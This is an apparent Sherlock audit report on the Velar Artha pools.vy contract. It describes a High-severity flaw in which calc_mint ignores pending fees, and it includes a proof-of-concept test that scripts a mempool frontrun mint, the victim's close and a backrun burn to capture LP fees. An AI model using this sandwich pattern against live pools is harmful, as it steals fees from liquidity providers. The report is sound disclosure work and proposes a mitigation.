Damaged Fern Bird

High

# pools.vy: calc_mint does not account for outstanding fees, allowing attackers to steal fees from LP

### Summary

Inside of the [calc_mint](https://github.com/sherlock-audit/2024-08-velar-artha/blob/main/gl-sherlock/contracts/pools.vy#L163-L172) the contract calculates how much LP-Tokens should be minted when a provider adds new liquidity. This does not account for outstanding fees. Therefor a new user gets the same LP-Token ratio as older LP providers. **This allows new providers to steal fees.**

### Root Cause

In the [`calc_mint`](https://github.com/sherlock-audit/2024-08-velar-artha/blob/main/gl-sherlock/contracts/pools.vy#L163-L172) function, LP tokens are calculated based on the [`total_reserves`](https://github.com/sherlock-audit/2024-08-velar-artha/blob/main/gl-sherlock/contracts/pools.vy#L119-L121) , which reflect the current pool state but do not account for any pending fees. This allows a large token holder to deposit just before a regular user closes their position.

When closing a position, the core contract  calls [`close`](https://github.com/sherlock-audit/2024-08-velar-artha/blob/main/gl-sherlock/contracts/pools.vy#L258-L276) function, updating the pool reserves to reflect the added tokens paid as fee. As a result, the pool now contains more liquidity.

The attacker can then unstake their LP tokens and, based on the ratio of their LP share relative to the total LP value before the attack, they are able to claim a significant portion of the fees paid by the user.

### Internal pre-conditions

1. Large position will be closed and attacker notices before the tx is settled (i.e. by looking at the mem-pool)

### External pre-conditions

N/A

### Attack Path

1. Mint large LP position
2. wait for closing transaction to settle
3. Burn the LP position

### Impact

The attacker is able to steal fees that should have been paid to the older LP.

### PoC

## Walkthrough

A user opens a large position in the pool:
```vyper
    # user opens positions and closes it after 1 weeks
    tx = open(VEL, STX, True, d(999), 10, price=d(5), sender=long)
    assert not tx.failed

    chain.pending_timestamp += round(datetime.timedelta(weeks=1).total_seconds())    
```

The attacker now mints new LP tokens with a relatively large position vs. the existing LPs. In this case the new LP is ~100x the old LP:
```vyper
    mint(VEL, STX, LP, d(10_000_000), d(50_000_000), price=d(5), sender=lp_provider2)
```

Close tx settles and fees get paid to the pool:
```vyper
    tx = close(VEL, STX, 1, price=d(5), sender=long)
```

The attacker now burns all his LP tokens:
```vyper
    lp_amount_lp1 = LP.balanceOf(lp_provider)
    burn(VEL, STX, LP, lp_amount_lp2, price=d(5), sender=lp_provider2)
```

The original LP only earned 1 of each token:
```vyper
    lp1_inital_value = d(10_000) * 5 + d(50_000)
    lp1_value = lp1_base * 5 + lp1_quote # (as quote tokens)
    lp1_profit = lp1_value - lp1_inital_value # (as quote tokens)
    assert lp1_profit < 10 # lp1_profit is 6: 1 of base and quote
```

The attacker earned most of the fees, ~120 quote tokens:
```vyper
    lp2_inital_value = d(10_000_000) * 5 + d(50_000_000)
    lp2_value = lp2_base * 5 + lp2_quote # (as quote tokens)
    lp2_profit = lp2_value - lp2_inital_value # (as quote tokens)
    assert lp2_profit > 100 # lp2_profit ~ 120 (as quote tokens)
```

## Diff

Update the [`conftest.py`](https://github.com/sherlock-audit/2024-08-velar-artha/blob/main/gl-sherlock/tests/conftest.py) to be the same as the currently planed parameters (based on sponsor msg in discord):
```diff
--- a/conftest.py.orig
+++ b/conftest.py
@@ -58,8 +58,8 @@ def LP2(project, core, owner):
 # ----------- Params -----------------

 PARAMS = {
-  'MIN_FEE'               : 1,
-  'MAX_FEE'               : 1,
+  'MIN_FEE'               : 10,
+  'MAX_FEE'               : 100,

   # Fraction of collateral (e.g. 1000).
   'PROTOCOL_FEE'          : 1000,
```

```diff
--- a/test_positions.py.orig
+++ b/test_positions.py
@@ -137,3 +137,52 @@ def test_value(setup, positions, open, VEL, STX, owner, long):
         'borrowing_paid_want'  : 0,
         'remaining'            : 1998000
     }
+
+def test_burn_fees(chain, setup, open, close, VEL, STX, LP, long, mint_token, core, mint, burn, lp_provider, lp_provider2):
+    setup()
+
+    # user opens positions and closes it after 1 weeks
+    tx = open(VEL, STX, True, d(999), 10, price=d(5), sender=long)
+    assert not tx.failed
+
+    chain.pending_timestamp += round(datetime.timedelta(weeks=1).total_seconds())    
+
+    # ============= frontrun part
+    mint_token(VEL, d(10_000_000), lp_provider2)
+    mint_token(STX, d(50_000_000), lp_provider2)
+    assert not VEL.approve(core.address, d(10_000_000), sender=lp_provider2).failed
+    assert not STX.approve(core.address, d(50_000_000), sender=lp_provider2).failed
+    mint(VEL, STX, LP, d(10_000_000), d(50_000_000), price=d(5), sender=lp_provider2)
+    # ============= frontrun part
+
+    # ============= user tx
+    tx = close(VEL, STX, 1, price=d(5), sender=long)
+    assert not tx.failed
+    # ============= user tx
+
+    # ============= backrun part
+    lp_amount_lp2 = LP.balanceOf(lp_provider2)
+    burn(VEL, STX, LP, lp_amount_lp2, price=d(5), sender=lp_provider2)
+    # ============= backrun part
+
+    # ============= original lp unstake
+    lp_amount_lp1 = LP.balanceOf(lp_provider)
+    burn(VEL, STX, LP, lp_amount_lp1, price=d(5), sender=lp_provider)
+    # ============= original lp unstake
+
+    lp1_base = VEL.balanceOf(lp_provider) - d(90_000) # ignore the unstaked balance
+    lp1_quote = STX.balanceOf(lp_provider) - d(50_000) # ignore the unstaked balance
+    lp2_base = VEL.balanceOf(lp_provider2)
+    lp2_quote = STX.balanceOf(lp_provider2)
+
+    # allow for small profit
+    lp1_inital_value = d(10_000) * 5 + d(50_000)
+    lp1_value = lp1_base * 5 + lp1_quote # (as quote tokens)
+    lp1_profit = lp1_value - lp1_inital_value # (as quote tokens)
+    assert lp1_profit < 10 # lp1_profit is 6: 1 of base and quote
+
+    # LP2 made a profit
+    lp2_inital_value = d(10_000_000) * 5 + d(50_000_000)
+    lp2_value = lp2_base * 5 + lp2_quote # (as quote tokens)
+    lp2_profit = lp2_value - lp2_inital_value # (as quote tokens)
+    assert lp2_profit > 100 # lp2_profit ~ 120 (as quote tokens)
```





### Mitigation

The contract `pools.vy` should call the `fees.vy` contract and look up the currently outstanding fees inside of the [`total_reserves`](https://github.com/sherlock-audit/2024-08-velar-artha/blob/main/gl-sherlock/contracts/pools.vy#L119-L121) function.